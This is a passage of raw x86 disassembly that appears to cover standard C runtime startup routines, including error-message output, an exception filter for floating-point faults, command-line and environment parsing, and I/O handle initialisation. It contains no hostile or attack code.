  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
